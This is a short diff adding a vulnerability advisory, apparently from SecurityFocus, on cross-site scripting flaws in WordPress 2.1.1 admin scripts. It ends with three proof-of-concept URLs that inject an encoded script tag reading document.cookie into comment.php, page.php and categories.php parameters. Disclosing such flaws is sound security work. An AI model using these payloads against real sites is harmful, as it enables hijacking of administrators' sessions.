@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/22738/info
+
+Wordpress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Version 2.1.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-admin/comment.php?action=deletecomment&p=39&c='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/wp-admin/page.php?action=delete&post='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E categories.php) http://www.example.com/wp-admin/categories.php?action=delete&cat_ID='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
